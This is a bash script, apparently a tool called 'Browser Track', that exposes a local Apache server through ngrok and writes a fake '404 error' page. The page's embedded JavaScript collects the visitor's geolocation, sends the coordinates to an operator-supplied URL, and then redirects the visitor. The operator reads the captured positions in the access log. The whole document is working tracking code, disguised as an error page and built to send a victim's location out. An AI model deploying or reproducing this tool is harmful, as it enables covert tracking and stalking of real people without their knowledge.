#!/bin/bash

#64_bit
#xterm -e ./ngrok_64 http 80 & clear

#32_Bit
xterm -e ./ngrok http 80 & clear
echo " ____                                    _____               _    
| __ ) _ __ _____      _____  ___ _ __  |_   _| __ __ _  ___| | __
|  _ \|  __/ _ \ \ /\ / / __|/ _ \  __|   | ||  __/ _  |/ __| |/ /
| |_) | | | (_) \ V  V /\__ \  __/ |      | || | | (_| | (__|   < 
|____/|_|  \___/ \_/\_/ |___/\___|_|      |_||_|  \____|\___|_|\_\ 
"

sleep 6
clear
read -p '           URL: ' varurl
read -p '           Redirect to: ' varred 
echo "<!DOCTYPE html> 
<html>
    <head>
        <title>404 error</title>
    </head>
    <body>
        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function Locate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
            url = \""$varurl"/log/\" + coords;
	    httpGet(url);
            console.log('Hello');
            setTimeout(autoUpdate, 1000);
          })
      };
      \$(document).ready(function(){
           Locate();
      });
</script>
<script>
            setTimeout(function(){
                window.location.href=\"$varred\";}, 3000);
        </script>
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp skull.jpg /var/www/html/skull.jpg
sudo service apache2 start
echo " ___                                     _____               _    
| __ ) ____ _____      _____  ___ _ __  |_   _|___ __ _  ___| | __
|  _ \|  __/ _ \ \ /\ / / __|/ _ \  __|   | ||  __/ _  |/ __| |/ /
| |_) | | | (_) \ V  V /\__ \  __/ |      | || | | (_| | (__|   < 
|____/|_|  \___/ \_/\_/ |___/\___|_|      |_||_|  \____|\___|_|\_\
                                                                  " > /var/log/apache2/access.log
tail -f /var/log/apache2/access.log

